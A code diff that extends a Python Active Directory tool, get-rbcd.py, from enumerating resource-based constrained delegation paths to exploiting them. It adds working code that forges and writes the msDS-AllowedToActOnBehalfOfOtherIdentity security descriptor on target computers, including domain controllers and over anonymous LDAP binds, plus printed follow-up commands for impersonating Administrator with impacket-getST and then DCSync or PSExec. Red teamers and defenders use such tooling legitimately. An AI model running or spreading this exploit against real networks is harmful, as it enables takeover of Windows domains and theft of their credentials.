@@ -3,16 +3,21 @@
 get-rbcd.py - Python port of Get-RBCD-Threaded by FatRodzianko
 https://github.com/FatRodzianko/Get-RBCD-Threaded
 
-Discovers Resource-Based Constrained Delegation (RBCD) attack paths in Active Directory.
+Discovers and exploits Resource-Based Constrained Delegation (RBCD) attack paths
+in Active Directory.
 
 Enumerates users, groups, and computer objects, then checks DACLs on computer objects
 for principals with GenericAll, GenericWrite, WriteOwner, WriteDacl, or WriteProp
 (on msDS-AllowedToActOnBehalfOfOtherIdentity) permissions.
 
+Can also write/clear msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD exploitation
+and cleanup, including via anonymous/null LDAP sessions.
+
 Enhancements over original:
-  - Pure Python (ldap3) - runs natively on Kali Linux
+  - Pure Python (ldap3) - runs natively on Kali Linux, no impacket required
   - Anonymous / Guest / null-session LDAP bind support
   - Checks write permissions on the DC computer object itself
+  - RBCD write and cleanup functionality (--write-rbcd / --clear-rbcd)
   - Kerberos authentication support
   - Concurrent ACL processing with ThreadPoolExecutor
   - JSON output option alongside CSV
@@ -167,6 +172,66 @@ def sid_length(data: bytes, offset: int = 0) -> int:
         return 0
     sub_authority_count = data[offset + 1]
     return 8 + (sub_authority_count * 4)
+
+
+def sid_to_bytes(sid_string: str) -> bytes:
+    """Convert a SID string (S-1-5-21-...) to binary format."""
+    parts = sid_string.split('-')
+    revision = int(parts[1])
+    authority = int(parts[2])
+    sub_authorities = [int(x) for x in parts[3:]]
+
+    sid_bytes = struct.pack('BB', revision, len(sub_authorities))
+    sid_bytes += authority.to_bytes(6, byteorder='big')
+    for sa in sub_authorities:
+        sid_bytes += struct.pack('<I', sa)
+
+    return sid_bytes
+
+
+def build_rbcd_sd(delegate_from_sid: str) -> bytes:
+    """
+    Build a self-relative security descriptor that allows the given SID
+    to act on behalf of another identity (RBCD).
+
+    This constructs the binary value for msDS-AllowedToActOnBehalfOfOtherIdentity.
+    Equivalent to what bloodyAD / impacket rbcd.py builds.
+    """
+    sid_bytes = sid_to_bytes(delegate_from_sid)
+
+    # Build ACE: ACCESS_ALLOWED_ACE_TYPE
+    # AceType(1) + AceFlags(1) + AceSize(2) + AccessMask(4) + SID(variable)
+    access_mask = 0x000F01FF  # 983551 - Full control for RBCD
+    ace_body = struct.pack('<I', access_mask) + sid_bytes
+    ace_size = 4 + len(ace_body)  # header(4) + body
+    ace = struct.pack('<BBH', 0x00, 0x00, ace_size) + ace_body  # ACE_TYPE=0, FLAGS=0
+
+    # Build ACL (DACL)
+    # AclRevision(1) + Sbz1(1) + AclSize(2) + AceCount(2) + Sbz2(2) + ACEs
+    acl_size = 8 + len(ace)
+    dacl = struct.pack('<BBHHH', 0x02, 0x00, acl_size, 1, 0x00) + ace
+
+    # Owner SID: S-1-0-0 (NULL SID)
+    owner_sid = sid_to_bytes("S-1-0-0")
+
+    # Build self-relative Security Descriptor
+    # Revision(1) + Sbz1(1) + Control(2) + OffsetOwner(4) + OffsetGroup(4) +
+    # OffsetSacl(4) + OffsetDacl(4) = 20 bytes header
+    sd_header_size = 20
+    offset_owner = sd_header_size
+    offset_dacl = offset_owner + len(owner_sid)
+    offset_group = 0   # No group
+    offset_sacl = 0     # No SACL
+
+    # Control: SE_DACL_PRESENT (0x0004) | SE_SELF_RELATIVE (0x8000) = 0x8004
+    control = 0x8004
+
+    sd = struct.pack('<BBH', 0x01, 0x00, control)
+    sd += struct.pack('<IIII', offset_owner, offset_group, offset_sacl, offset_dacl)
+    sd += owner_sid
+    sd += dacl
+
+    return sd
 
 
 def parse_guid(data: bytes) -> str:
@@ -752,6 +817,213 @@ def check_anonymous_rbcd(args, base_dn):
 
 
 # =============================================================================
+# RBCD Write / Clear Operations
+# =============================================================================
+
+def resolve_sid(conn, base_dn, identifier, domain) -> str:
+    """
+    Resolve a sAMAccountName or DN to a SID string.
+    If identifier already looks like a SID (S-1-...), return it directly.
+    """
+    if identifier.upper().startswith("S-1-"):
+        return identifier
+
+    # Try by sAMAccountName
+    search_filter = f"(sAMAccountName={escape_filter_chars(identifier)})"
+    conn.search(base_dn, search_filter, attributes=["objectSid"], search_scope=ldap3.SUBTREE)
+
+    if conn.entries:
+        raw_sid = conn.entries[0]["objectSid"].raw_values[0]
+        if isinstance(raw_sid, bytes):
+            return parse_sid(raw_sid)
+        return str(raw_sid)
+
+    cprint(f"[!] Could not resolve '{identifier}' to a SID", Colors.RED)
+    return None
+
+
+def resolve_target_dn(conn, base_dn, target) -> str:
+    """
+    Resolve a target computer to its DN.
+    Accepts: DN, sAMAccountName, or dNSHostName.
+    """
+    # If it looks like a DN already
+    if target.upper().startswith("CN="):
+        return target
+
+    # Try sAMAccountName (with or without trailing $)
+    sam = target if target.endswith("$") else f"{target}$"
+    search_filter = f"(&(samAccountType=805306369)(|(sAMAccountName={escape_filter_chars(sam)})(dNSHostName={escape_filter_chars(target)})))"
+    conn.search(base_dn, search_filter, attributes=["distinguishedName"], search_scope=ldap3.SUBTREE)
+
+    if conn.entries:
+        dn = conn.entries[0]["distinguishedName"].value
+        return str(dn)
+
+    cprint(f"[!] Could not resolve target '{target}' to a DN", Colors.RED)
+    return None
+
+
+def write_rbcd(args, base_dn):
+    """
+    Write msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer object.
+    This configures RBCD delegation from the specified principal.
+    """
+    cprint(f"\n{'='*70}", Colors.RED)
+    cprint("[*] RBCD WRITE MODE - Modifying Active Directory", Colors.RED)
+    cprint(f"{'='*70}\n", Colors.RED)
+
+    dc_host = args.dc_ip or args.domain
+    use_ssl = not args.insecure
+    port = 636 if use_ssl else 389
+
+    server = Server(dc_host, port=port, use_ssl=use_ssl, get_info=ALL, connect_timeout=10)
+
+    # Establish connection based on auth method
+    if args.anonymous or (not args.username and not args.password):
+        cprint(f"[*] Using anonymous bind for RBCD write to {dc_host}:{port}", Colors.YELLOW)
+        conn = Connection(server, authentication=ANONYMOUS)
+    elif args.username and args.password:
+        if "\\" in args.username:
+            ntlm_user = args.username
+        else:
+            ntlm_user = f"{args.domain}\\{args.username}"
+        cprint(f"[*] Using NTLM auth as {ntlm_user} for RBCD write", Colors.YELLOW)
+        conn = Connection(server, user=ntlm_user, password=args.password, authentication=NTLM)
+    else:
+        cprint("[!] No valid auth method for write operation", Colors.RED)
+        return False
+
+    if not conn.bind():
+        cprint(f"[!] Bind failed: {conn.result}", Colors.RED)
+        return False
+
+    cprint(f"[+] Bind successful", Colors.GREEN)
+
+    # Resolve the delegate-from SID
+    delegate_sid = resolve_sid(conn, base_dn, args.delegate_from, args.domain)
+    if not delegate_sid:
+        cprint("[!] Cannot proceed without a valid delegate-from SID", Colors.RED)
+        conn.unbind()
+        return False
+    cprint(f"[+] Delegate-from SID: {delegate_sid}", Colors.GREEN)
+
+    # Resolve target DN
+    target_dn = resolve_target_dn(conn, base_dn, args.target)
+    if not target_dn:
+        cprint("[!] Cannot proceed without a valid target DN", Colors.RED)
+        conn.unbind()
+        return False
+    cprint(f"[+] Target DN: {target_dn}", Colors.GREEN)
+
+    # Build the security descriptor
+    sd_bytes = build_rbcd_sd(delegate_sid)
+    cprint(f"[*] Built security descriptor ({len(sd_bytes)} bytes)", Colors.CYAN)
+
+    # Write it
+    cprint(f"[*] Writing msDS-AllowedToActOnBehalfOfOtherIdentity...", Colors.YELLOW)
+    result = conn.modify(
+        target_dn,
+        {'msDS-AllowedToActOnBehalfOfOtherIdentity': [(ldap3.MODIFY_REPLACE, [sd_bytes])]}
+    )
+
+    if result:
+        cprint(f"[+] SUCCESS! RBCD delegation configured.", Colors.GREEN)
+        cprint(f"[+] {args.delegate_from} ({delegate_sid}) can now delegate to {target_dn}", Colors.GREEN)
+
+        # Resolve the target hostname for the SPN (not the DN)
+        target_hostname = None
+        search_filter = f"(distinguishedName={escape_filter_chars(target_dn)})"
+        conn.search(base_dn, search_filter, attributes=["dNSHostName", "sAMAccountName"], search_scope=ldap3.SUBTREE)
+        if conn.entries:
+            target_hostname = str(conn.entries[0]["dNSHostName"].value or "")
+            if not target_hostname:
+                sam = str(conn.entries[0]["sAMAccountName"].value or "")
+                target_hostname = sam.rstrip("$") + "." + args.domain
+
+        if not target_hostname:
+            # Fallback: try to extract hostname from DN
+            import re
+            cn_match = re.match(r'CN=([^,]+)', target_dn, re.IGNORECASE)
+            target_hostname = (cn_match.group(1) + "." + args.domain) if cn_match else args.target
+
+        cprint(f"\n[*] Next steps:", Colors.CYAN)
+        cprint(f"  1. Get a service ticket via S4U2Self + S4U2Proxy:", Colors.CYAN)
+        cprint(f"     impacket-getST '{args.domain}/{args.delegate_from}:<PASSWORD>' \\", Colors.CYAN)
+        cprint(f"       -spn cifs/{target_hostname} \\", Colors.CYAN)
+        cprint(f"       -impersonate Administrator -dc-ip {dc_host}", Colors.CYAN)
+        cprint(f"  2. Export and use the ticket:", Colors.CYAN)
+        cprint(f"     export KRB5CCNAME=Administrator@cifs_{target_hostname}@{args.domain.upper()}.ccache", Colors.CYAN)
+        cprint(f"  3. DCSync or PSExec with the ticket", Colors.CYAN)
+        cprint(f"\n[!] REMEMBER to clean up with --clear-rbcd when done!", Colors.RED)
+    else:
+        cprint(f"[!] FAILED to write RBCD: {conn.result}", Colors.RED)
+
+    conn.unbind()
+    return result
+
+
+def clear_rbcd(args, base_dn):
+    """
+    Clear msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer object.
+    Removes the RBCD configuration (cleanup after exploitation).
+    """
+    cprint(f"\n{'='*70}", Colors.MAGENTA)
+    cprint("[*] RBCD CLEANUP MODE - Removing delegation", Colors.MAGENTA)
+    cprint(f"{'='*70}\n", Colors.MAGENTA)
+
+    dc_host = args.dc_ip or args.domain
+    use_ssl = not args.insecure
+    port = 636 if use_ssl else 389
+
+    server = Server(dc_host, port=port, use_ssl=use_ssl, get_info=ALL, connect_timeout=10)
+
+    if args.anonymous or (not args.username and not args.password):
+        cprint(f"[*] Using anonymous bind for RBCD cleanup", Colors.YELLOW)
+        conn = Connection(server, authentication=ANONYMOUS)
+    elif args.username and args.password:
+        if "\\" in args.username:
+            ntlm_user = args.username
+        else:
+            ntlm_user = f"{args.domain}\\{args.username}"
+        cprint(f"[*] Using NTLM auth as {ntlm_user} for RBCD cleanup", Colors.YELLOW)
+        conn = Connection(server, user=ntlm_user, password=args.password, authentication=NTLM)
+    else:
+        cprint("[!] No valid auth method for cleanup", Colors.RED)
+        return False
+
+    if not conn.bind():
+        cprint(f"[!] Bind failed: {conn.result}", Colors.RED)
+        return False
+
+    cprint(f"[+] Bind successful", Colors.GREEN)
+
+    # Resolve target DN
+    target_dn = resolve_target_dn(conn, base_dn, args.target)
+    if not target_dn:
+        cprint("[!] Cannot proceed without a valid target DN", Colors.RED)
+        conn.unbind()
+        return False
+    cprint(f"[+] Target DN: {target_dn}", Colors.GREEN)
+
+    # Clear the attribute
+    cprint(f"[*] Clearing msDS-AllowedToActOnBehalfOfOtherIdentity...", Colors.YELLOW)
+    result = conn.modify(
+        target_dn,
+        {'msDS-AllowedToActOnBehalfOfOtherIdentity': [(ldap3.MODIFY_REPLACE, [])]}
+    )
+
+    if result:
+        cprint(f"[+] SUCCESS! RBCD delegation removed from {args.target}", Colors.GREEN)
+        cprint(f"[+] msDS-AllowedToActOnBehalfOfOtherIdentity has been cleared", Colors.GREEN)
+    else:
+        cprint(f"[!] FAILED to clear RBCD: {conn.result}", Colors.RED)
+
+    conn.unbind()
+    return result
+
+
+# =============================================================================
 # Output Functions
 # =============================================================================
 
@@ -826,16 +1098,16 @@ def banner():
     print(f"""
 {Colors.RED}╔══════════════════════════════════════════════════════════════╗
 ║                                                              ║
-║   ██████╗ ██████╗  ██████╗██████╗     ██████╗ ██╗   ██╗     ║
-║   ██╔══██╗██╔══██╗██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝     ║
-║   ██████╔╝██████╔╝██║     ██║  ██║    ██████╔╝ ╚████╔╝      ║
-║   ██╔══██╗██╔══██╗██║     ██║  ██║    ██╔═══╝   ╚██╔╝       ║
-║   ██║  ██║██████╔╝╚██████╗██████╔╝    ██║        ██║        ║
-║   ╚═╝  ╚═╝╚═════╝  ╚═════╝╚═════╝     ╚═╝        ╚═╝        ║
+║   ██████╗ ██████╗  ██████╗██████╗     ██████╗ ██╗   ██╗      ║
+║   ██╔══██╗██╔══██╗██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝      ║
+║   ██████╔╝██████╔╝██║     ██║  ██║    ██████╔╝ ╚████╔╝       ║
+║   ██╔══██╗██╔══██╗██║     ██║  ██║    ██╔═══╝   ╚██╔╝        ║
+║   ██║  ██║██████╔╝╚██████╗██████╔╝    ██║        ██║         ║
+║   ╚═╝  ╚═╝╚═════╝  ╚═════╝╚═════╝     ╚═╝        ╚═╝         ║
 ║                                                              ║
 ║  Resource-Based Constrained Delegation Enumerator            ║
 ║  Python port of Get-RBCD-Threaded by FatRodzianko            ║
-║  Enhanced with anonymous/guest access checks                 ║
+║  Enumerate | Exploit | Cleanup                               ║
 ║                                                              ║
 ╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
 """)
@@ -845,7 +1117,7 @@ def main():
     banner()
 
     parser = argparse.ArgumentParser(
-        description="Discover RBCD attack paths in Active Directory",
+        description="Discover and exploit RBCD attack paths in Active Directory",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
@@ -866,6 +1138,19 @@ Examples:
 
   # JSON output
   %(prog)s -d corp.local -u admin -p pass --dc-ip 10.10.10.1 --json results.json
+
+  # Write RBCD delegation (authenticated)
+  %(prog)s -d corp.local -u admin -p pass --dc-ip 10.10.10.1 -i \\
+      --write-rbcd --target DC01 --delegate-from CODY_ROY
+
+  # Write RBCD delegation (anonymous - like Operation Endgame)
+  %(prog)s -d corp.local --dc-ip 10.10.10.1 -i \\
+      --write-rbcd --target 'CN=DC01,OU=Domain Controllers,DC=corp,DC=local' \\
+      --delegate-from CODY_ROY
+
+  # Cleanup - remove RBCD delegation after exploitation
+  %(prog)s -d corp.local --dc-ip 10.10.10.1 -i \\
+      --clear-rbcd --target DC01
         """
     )
 
@@ -892,6 +1177,17 @@ Examples:
     parser.add_argument("--no-color", action="store_true",
                         help="Disable colored output")
 
+    # RBCD Write/Clear operations
+    rbcd_group = parser.add_argument_group("RBCD Write/Clear (use with caution)")
+    rbcd_group.add_argument("--write-rbcd", action="store_true",
+                        help="Write msDS-AllowedToActOnBehalfOfOtherIdentity on target (EXPLOITATION)")
+    rbcd_group.add_argument("--clear-rbcd", action="store_true",
+                        help="Clear msDS-AllowedToActOnBehalfOfOtherIdentity on target (CLEANUP)")
+    rbcd_group.add_argument("--target",
+                        help="Target computer: DN, sAMAccountName, or dNSHostName")
+    rbcd_group.add_argument("--delegate-from",
+                        help="Principal to delegate from: sAMAccountName or SID (required for --write-rbcd)")
+
     args = parser.parse_args()
 
     # Disable colors if requested
@@ -904,6 +1200,50 @@ Examples:
 
     # Build base DN
     base_dn = ",".join([f"DC={part}" for part in args.domain.split(".")])
+
+    # Handle RBCD write/clear modes
+    if args.write_rbcd:
+        if not args.target:
+            cprint("[!] --write-rbcd requires --target", Colors.RED)
+            sys.exit(1)
+        if not args.delegate_from:
+            cprint("[!] --write-rbcd requires --delegate-from", Colors.RED)
+            sys.exit(1)
+
+        cprint(f"\n{Colors.RED}{'!'*70}", Colors.RED)
+        cprint(f"  WARNING: You are about to MODIFY an Active Directory object.", Colors.RED)
+        cprint(f"  Target:        {args.target}", Colors.RED)
+        cprint(f"  Delegate-from: {args.delegate_from}", Colors.RED)
+        cprint(f"{'!'*70}{Colors.RESET}\n", Colors.RED)
+
+        confirm = input(f"{Colors.RED}Type 'YOUREALLYREALLYSURE' to confirm: {Colors.RESET}")
+        if confirm.strip() != "YOUREALLYREALLYSURE":
+            cprint("[*] Aborted.", Colors.YELLOW)
+            sys.exit(0)
+
+        success = write_rbcd(args, base_dn)
+        elapsed = time.time() - start_time
+        cprint(f"\n[*] Execution time: {elapsed:.2f} seconds", Colors.BLUE)
+        sys.exit(0 if success else 1)
+
+    if args.clear_rbcd:
+        if not args.target:
+            cprint("[!] --clear-rbcd requires --target", Colors.RED)
+            sys.exit(1)
+
+        cprint(f"\n{Colors.MAGENTA}{'!'*70}", Colors.MAGENTA)
+        cprint(f"  Clearing RBCD delegation on: {args.target}", Colors.MAGENTA)
+        cprint(f"{'!'*70}{Colors.RESET}\n", Colors.MAGENTA)
+
+        confirm = input(f"{Colors.MAGENTA}Type 'YES' to confirm cleanup: {Colors.RESET}")
+        if confirm.strip() != "YES":
+            cprint("[*] Aborted.", Colors.YELLOW)
+            sys.exit(0)
+
+        success = clear_rbcd(args, base_dn)
+        elapsed = time.time() - start_time
+        cprint(f"\n[*] Execution time: {elapsed:.2f} seconds", Colors.BLUE)
+        sys.exit(0 if success else 1)
 
     # If anon-only mode, skip authenticated scan
     if args.anon_only:
